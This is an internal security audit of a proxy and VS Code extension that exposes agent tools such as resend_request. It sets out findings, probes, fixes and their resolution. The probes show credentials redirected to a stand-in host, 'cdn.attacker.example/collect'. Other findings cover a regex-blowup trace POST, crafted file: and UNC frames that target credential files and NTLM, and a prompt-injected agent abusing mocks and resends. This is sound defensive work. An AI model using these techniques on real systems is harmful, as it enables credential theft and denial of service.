# Review 3: v0.3.0 security (independent, `feature/0.3.0` working tree) — findings and fix plan

Scope: trace side channel, LAN gate exemption, open source / `get_request_source`, `send` / `resend_request`,
rewriteLocalhost, the entry's zone chain, faults/throttle. Verified by reading the code plus throwaway probes
(deleted): a vitest probe against `AgentApi`, a websocket + trace-POST probe against a real `InterceptProxy`,
and a regex timing script. Existing suites `proxy/test/{v3,source,lan}.test.ts` pass (81).

| # | Sev | Finding | Owner |
|---|---|---|---|
| 1 | MED | `resend_request`'s "origins the app already contacted" is not a boundary, and the original credentials follow the URL to whichever origin passes: (a) an edited URL on another app origin gets the original `Authorization`/`Cookie` (and refilled `[redacted]` headers and query secrets); (b) "app origins" include exchanges that never reached a server — LAN-SSRF-blocked attempts, TLS failures, URLs rewritten by a breakpoint edit, mocks, and anything any local process sent through the proxy; (c) `send` runs on the loopback listener, so a LAN (iPhone) exchange resent by an agent skips the §7 SSRF guard and gets the 10.0.2.2 → 127.0.0.1 rewrite. | H |
| 2 | LOW-MED | Trace sink CPU DoS: `parseDartStack`'s regexes are quadratic on long lines. One ~1 MB trace POST blocks the extension host's event loop for **7.2 s** (measured through the proxy). No auth on loopback. | P |
| 3 | LOW | "Open source" opens **any** `file:` path a trace names: there is no workspace check, although CONTRACTS §9.3 promises a "file not in the workspace" error. Trace data is app-controlled, and any loopback client can attach a crafted source to its own request. On Windows a `file://host/share/…` frame becomes a UNC path (SMB/NTLM), unless VS Code's UNC allow-list stops it. | E + lead |
| 4 | LOW | `get_request_source` drops `path` outside the project but returns `uri` verbatim, so `file:///Users/<name>/…` frames give agents (and the model provider) absolute paths. | H |
| 5 | INFO | The entry posts trace batches concurrently, with no connection cap. On LAN, each concurrent POST is another tunnel against `LAN_MAX_PER_IP` (64), which app traffic shares. At the cap the gate drops connections, and dart:io sends that app request DIRECT: TLS is still verified, but the request is not intercepted. | E |
| 6 | INFO | `captureSource: false` only reaches Flutter sessions (it is a dart-define). Plain-Dart sessions still add `x-fi-id`, run the zone chain and post traces. Also accepted by design: on DIRECT, the opaque `x-fi-id` reaches real servers. | E |
| 7 | INFO | MCP annotations: `simulate_network` says `idempotentHint: true`, but with `url` every call inserts another rule. The global `offline` profile has `destructiveHint: false`, so a client may auto-approve cutting off all app traffic. | H |

## Details

### 1 (MED) resend_request: an origin allow-list that leaks credentials across origins
`packages/extension/src/agent/api.ts:613-675` (`appOrigins`, `resendRequest`), `:679-715` (`restoreRedacted*`);
`packages/proxy/src/intercept-proxy.ts:537` (`recordBlocked` → LAN-denied URL recorded with no initiator),
`:1269` (`ex.url = edit.url` on a breakpoint edit), `:1340-1355` (`tls-*` records); confirmation text
`src/agent/lmTools.ts:240`.

- **(a) Credentials go cross-origin.** The probe recorded a `bank` exchange
  (`https://api.bank.example/me?access_token=SECRETQ`, `authorization: Bearer SECRET`, `cookie: sid=S`) and an
  unrelated `cdn` exchange (`https://cdn.attacker.example/x.png`, state `error`). Then it called:
  - `resend_request({id:'bank', edit:{url:'https://cdn.attacker.example/collect'}})`, which sent
    `authorization: Bearer SECRET` and `cookie: sid=S` to the CDN;
  - with `edit.headers:{authorization:'[redacted]'}` and `?access_token=[redacted]`, which refilled both
    secrets for the CDN.

  The agent never sees the secrets, yet it can deliver them to any origin that passes the check. Redaction is
  meant to stop exactly that.
- **(b) The allow-list can be filled at will.** It is built from every exchange without `initiator`, including:
  - `lan-*` records of SSRF-*blocked* LAN attempts (e.g. `http://127.0.0.1:6379/`);
  - `tls-*` records, whose host comes from the client's SNI;
  - mocked, blocked and faulted exchanges that never reached a server;
  - URLs rewritten by a request-breakpoint edit (`resume_request` with `edit.url`, the agent's own tool);
  - traffic from **any** local process using the unauthenticated loopback proxy.

  Example: an agent pauses one app request and resumes it with `edit.url = http://127.0.0.1:9200/`. That URL
  now counts as an app origin, so `resend_request` can then send any method and body there, as often as it
  likes, without the app. A prompt-injected agent can also use a mock to steer the app to an origin it
  controls, then resend a credentialed request there.
- **(c) LAN exchanges skip the LAN guard.** `send` always goes through the loopback listener: no §7 SSRF guard,
  and rewriteLocalhost applies. Resending an iPhone exchange that went to `http://10.0.2.2:5432` (a LAN host for
  the phone) reaches **this Mac's** `127.0.0.1:5432`, as does resending to a LAN-blocked `127.0.0.1` origin.
  This is the only way traffic from a LAN client can end up on the 10.0.2.2 → 127.0.0.1 rewrite (see "Checked"
  below).
- The Copilot confirmation says "(only to a host the app already contacted)". It does not say when the target
  origin differs from the original's, so it reassures more than it should. MCP annotations are right
  (`destructiveHint` and `openWorldHint` are true).
- Context: since 0.2.0, `resume_request` with `edit.url` can already redirect *one paused app request* with its
  headers anywhere. `resend_request` makes that repeatable, removes the need for the app, and adds refilling of
  redacted values.

**Fix:**
- Same-origin only: the edited URL must have the original exchange's origin. Path, query, method, headers and
  body stay editable. If cross-origin is kept, then on an origin change drop `authorization`, `cookie`,
  `proxy-*` and every header or query parameter the redactor would redact, and never refill `[redacted]`
  values.
- Build the allow-list from app exchanges that reached the network: no `initiator`, not `lan-*` / `tls-*`, a
  status from upstream (not mocked, blocked, faulted or errored), and the URL the app *sent*. Keep an
  `originalUrl` when an edit changes it.
- Refuse to resend exchanges that came from a LAN socket, or send them through the gate's guarded path with no
  rewrite. Record `Exchange.lan` or similar so the host can tell.
- Confirmation text: name the target origin, and say "credentials of <original origin>" whenever they differ.
- Consider the same credential-drop rule for `resume_request` with an `edit.url` that changes the origin.

### 2 (LOW-MED) Quadratic stack parsing blocks the extension host
`packages/proxy/src/source.ts:44` (`VM_FRAME = /^#\d+\s+(.+?)\s+\((.*)\)\s*$/`) and `:48` (`TERSE_FRAME`), run
by `onTrace` (`intercept-proxy.ts:821-842`) on every trace in a POST (`trace.ts:20`: up to 500 per POST,
16 KB each, 1 MB body).

| Input (16 KB) | Time |
|---|---|
| `'a  b' + ' '.repeat(16K) + 'c'` | 117 ms |
| `'#0 a' + ' '.repeat(16K) + '(b'` | 145 ms |
| 63 such stacks in one POST (`toSourceInfo` only) | 7.46 s |
| The same POST through a running proxy | 204 after 7.24 s, max event-loop lag **7228 ms** |

The proxy runs in the VS Code extension host. Each POST freezes every extension, the MCP server and the UI for
seconds, and repeated POSTs keep them frozen. Anyone who can reach the proxy can send one: app code or its
dependencies, any local process on 127.0.0.1, apps on an adb-reversed device or the emulator, or the pinned
LAN peer.

**Fix:**
- Skip lines over ~1–2 KB before matching (real frames are short).
- Parse linearly: VM frames with `lastIndexOf(' (')`, terse frames by splitting at the first run of two or more
  spaces.
- Cap traces per POST at 50 (the entry's batch size).
- Better: store the raw stack (≤ 16 KB) and parse only when it joins a recorded exchange. That bounds parsing
  to traces the proxy needs.

### 3 (LOW) Open source opens arbitrary files
`packages/extension/src/extension.ts:183-188` → `src/source/resolve.ts:117-124` (`file:` URIs → any path) →
`src/source/open.ts:15-21` (`openTextDocument(Uri.file(path))`). `inProject` is computed but never enforced.

How a crafted source gets in front of the user: any loopback client (or app dependency) sends a request with its
own `x-fi-id` and posts a matching trace whose frame is `file:///Users/me/.aws/credentials`, `file:///etc/…`, or
on Windows `file://evil.example/share/x.dart`. The user clicks "Open source" (or the app-frame link).

Impact:
- A local file opens in a preview tab. Low on its own, but it can show secrets on screen, and the tab is
  presented as the app's code.
- On Windows, `fileURLToPath` turns the host form into `\\evil.example\share\x.dart`, which leaks NTLM
  credentials over SMB unless `security.restrictUNCAccess` blocks it. That setting is on by default in current
  VS Code; forks and older builds may differ.

Package URIs are fine: `../` and `%2e%2e` cannot escape the package root after WHATWG normalisation, and
encoded `/` is rejected.

**Fix:**
- Open only `inProject` files, plus files under a package root from `package_config.json` (pub cache, path
  dependencies).
- Reject `file:` URIs with a host, and UNC or device paths.
- For anything else, show the path and ask first.
- Return the "file not in the workspace" error the contract promises.

### 4 (LOW) Absolute paths reach agents through `uri`
`packages/extension/src/agent/api.ts:489-505` (`frameView`). Probe: a frame
`file:///Users/alice/secret-client/bin/main.dart` came back verbatim in both `appFrame.uri` and `frames[].uri`,
although `path` was correctly omitted. This happens for plain-Dart programs (whose frames are `file:` URIs) and
for any crafted trace.

**Fix:** for `file:` URIs, report the project-relative path (as `uri` or `path`), or
`file:<outside the project>`.

### 5 (INFO) Side-channel connections count against the LAN per-IP cap
Entry `_flushTraces` / `_postTraces` (`src/entry/generator.ts:198-214`) starts every pending batch at once, and
the trace client has no `maxConnectionsPerHost`. A burst of more than 50 requests in 100 ms opens extra
CONNECT tunnels. On LAN they share `LAN_MAX_PER_IP = 64` (`lan.ts:48`) with the app's own tunnels. Past the
cap the gate destroys the connection, and dart:io sends *that app request* DIRECT (verified TLS, but not
intercepted). This is marginal in practice.

**Fix:** set `maxConnectionsPerHost = 1` on the trace client (posts queue on one keep-alive connection).

### 6 (INFO) Trace opt-out and DIRECT
- `withInterceptDefines` (`src/debug/rewrite.ts:81-86`) passes `FLUTTER_INTERCEPT_TRACE=0` to Flutter only.
  For plain-Dart sessions with `captureSource: false`, generate the entry with tracing off: the file is per
  target, so this stays deterministic.
- `x-fi-id` reaching real servers on DIRECT (proxy gone, app reopened later) is documented in CONTRACTS §9.1.
  It reveals instrumentation and a per-run request counter, nothing else. Accepted.

### 7 (INFO) Annotations
`src/agent/mcp/server.ts:37`: `simulate_network` with `url` is not idempotent, since each call adds a rule.
Consider `destructiveHint: true` for the global `offline` / `flaky` profile, or at least say "all app traffic"
in the tool title, as the Copilot confirmation already does.

## Checked, fine
- **Trace data stays on the machine.**
  - The side channel uses a dedicated client built under `_UntracedOverrides`: never wrapped, never traced, no
    recursion.
  - Its `findProxy` is `PROXY <addr>` with no `DIRECT`. dart:io resolves only the proxy host, never the
    `.invalid` name.
  - The trace host's TLS is verified against the install CA. A rogue listener at the proxy address (a stale
    LAN IP on another network, another app on the device's localhost) gets the CONNECT but cannot read stacks.
  - Over LAN, stacks travel inside TLS. Only the opaque id leaks on DIRECT (#6).
- **Header stripping.** `x-fi-id` and `x-fi-send` are removed in the mandatory `preprocessRequest` hook, which
  fails closed, from both `rawHeaders` and `headers`:
  - plain, mock, h1 and h2 routes;
  - request-breakpoint edits (case-insensitive `deleteHeader`);
  - `send` (both drop lists);
  - **websocket upgrades** (probe: upstream saw neither header);
  - redirects (the proxy doesn't follow them; dart:io re-sends through the proxy and the header is stripped
    again).

  Neither header is ever in `Exchange.requestHeaders`. The trace sink is never recorded, throttled or
  rule-matched.
- **Join maps and poisoning.**
  - Bounds: ≤ 2000 entries per side, 60 s TTL, ≤ 16 exchange ids per trace, stacks ≤ 16 KB, body ≤ 1 MB.
    Content-encoded bodies are ignored, so there is no decompression bomb. Worst-case retained memory is tens
    of MB.
  - Ids are a 64-bit `Random.secure` prefix plus a counter and never go upstream through the proxy, so a third
    party cannot attach a source to someone else's exchange. Flooding only evicts entries (the feature
    degrades).
  - A client can decorate only its own requests. "Open source" is where that matters (#3).
- **LAN exemption for the trace host (`lan.ts:288`).**
  - `admits()` (token + pinned peer) runs before it. The exemption only skips the CONNECT-time precheck, which
    returned "unresolvable → allow" for `.invalid` anyway.
  - Inside a tunnel to the trace host, mockttp builds `req.url` from the tunnel name (preferred over `Host` and
    SNI), so relative-form requests get the local 204.
  - Absolute-form requests name their own target and hit the 403 rule.
  - Websockets and anything forwarded use the gate's guarded agents. Their connect-time IP check is not
    exempt, and `.invalid` does not resolve.
  - Case, trailing-dot, bracket and port variants all normalise the same way. A mismatch can only make a
    request *local*, never forwarded unguarded.
  - mockttp's raw and TLS passthrough are off.
  - A closed gate answers 407 before the trace rule.
- **rewriteLocalhost.**
  - `getAgent` returns a LAN socket's guarded agent before any pooled or rewriting agent, for websockets too
    (mockttp passes the connection), so LAN clients never get the alias.
  - Matching is exact on WHATWG-normalised hostnames, and TLS identity is still checked against the alias.
  - For loopback clients it adds no reach that an emulator lacks (10.0.2.2 already is the host's loopback).
  - mockttp's socket-based loop check catches requests to the proxy's own port.
  - The one widening is the loopback `send` of LAN exchanges (#1c).
- **`send` input handling.**
  - Header names must be tokens; values may not contain CR, LF or NUL. The method must be a token and not
    CONNECT.
  - Userinfo is rejected, `Host` comes from the URL, framing is recomputed, and `proxy-authorization`,
    `x-fi-*` and the trace host are refused.
  - The request is sent as a normalised absolute-form URL, so the agent's origin check and mockttp parse the
    same string. No parser differential found for backslashes, IPv4 shorthand, IPv6 or trailing dots.
  - Redirects are not followed, and upstream TLS stays strict.
- **Snippets.** Shell quoting is correct: single quotes, or ANSI-C quoting with `\\`, `\'` and control
  characters escaped. Dart literals escape `$`, and raw strings are guarded. Agents get snippets built from the
  redacted view.
- **Zone chain.**
  - It is off in profile and release (`dart.vm.profile` / `dart.vm.product` consts), and release builds are
    never intercepted (`rewrite.ts:266`).
  - No `onError`, so the app keeps its error zone. `_currentChain` is restored in `finally`, and the chain
    depth is capped at 10.
  - The flush timer runs in the root zone, and `_traced`'s `.then` passes errors through unchanged.
  - Binding init and `runApp` both stay inside the same zones as before, so this adds no new zone-mismatch
    exposure.
- **Faults and throttle.**
  - Everything is applied after the tunnel and TLS are up (`beforeRequest`, taps), never at CONNECT, so no
    DIRECT fallback.
  - The trace sink is exempt from profiles.
  - The `timeout` hold is bounded by `breakpointTimeoutMs` and released when the app leaves or the proxy stops.
  - The shaper applies backpressure (`write()` returns false; no read-ahead) and stops when the socket closes.
- **Other.**
  - `get_body_shape` keeps keys in a `Map` (no prototype pollution) and is bounded by the 5 MB body.
  - The webview has no HTML sinks and a nonce-based CSP.

## Fix plan
- **H:**
  - #1: same-origin resend (or drop credentials and skip refills on an origin change); allow-list only from
    app exchanges that reached the network, using the sent URL; no loopback resend of LAN exchanges;
    confirmation names the target origin.
  - #4: no absolute `file:` paths in `uri`.
  - #7: annotations.
- **P:**
  - #2: line-length guard and linear parsing; ≤ 50 traces per POST; parse only on join.
  - #1: record which exchanges came from a LAN socket and keep `originalUrl` on edits.
- **E + lead:**
  - #3: open only project or package-root files; reject UNC and host forms; the "not in the workspace" error.
  - #5: `maxConnectionsPerHost = 1` on the trace client.
  - #6: trace opt-out for plain-Dart entries.
- Before release, re-run `proxy/test/{v3,lan}.test.ts` with:
  - a websocket `x-fi-id` case (add it: there is no test for it today);
  - a 1 MB crafted trace POST asserting event-loop lag under ~100 ms;
  - agent tests that a cross-origin resend carries no `authorization`/`cookie` and that LAN-blocked or edited
    URLs don't count as app origins.

## Resolution (2026-10-09, before release)
| # | Status | Fix |
|---|---|---|
| 1 | fixed | `resend_request` only for an app exchange that reached the server unchanged (`completed`, no `initiator`, no `matchedRuleId`, not `viaLan`, not a `lan-*`/`tls-*` record) and only to **that exchange's own origin** (normalised `URL.origin`; no userinfo). The "origins the app contacted" set is gone. New `Exchange.viaLan` (proxy, decided per connection). The Copilot confirmation names method + origin + path. Tests for every refusal and the cross-origin tricks. CONTRACTS §9.5. |
| 2 | fixed | Parser is string-ops only (no backtracking regex), lines > 2 KB skipped, ≤ 50 traces per POST, raw traces bounded (2000 / 8 M chars / 60 s) and parsed only when joined. Regression: a 949 KB adversarial POST joined to 50 exchanges stalls the loop ≤ 4 ms (test fails > 100 ms). |
| 3 | fixed | `openFrame` refuses anything outside the workspace folders and the resolved package roots (realpath on both sides, so symlinks can't escape), UNC/device and relative paths; `resolveFrames` never yields a path for `file://<host>/…`. CONTRACTS §9.4. |
| 4 | fixed | `get_request_source` keeps `package:`/`dart:` URIs, maps project files to `<project>/<rel>`, and returns `"<outside project>"` (no path) for everything else. |
| 5 | fixed | Trace client `maxConnectionsPerHost = 1` (template v4, CONTRACTS §1). |
| 6 | accepted | Documented: `captureSource` applies to Flutter sessions only (README, setting text, CONTRACTS §9.1). |
| 7 | fixed | `simulate_network`: `idempotentHint: false`, `destructiveHint: true`. Also added: a websocket-upgrade test that `x-fi-id` / `x-fi-send` never reach the server. |
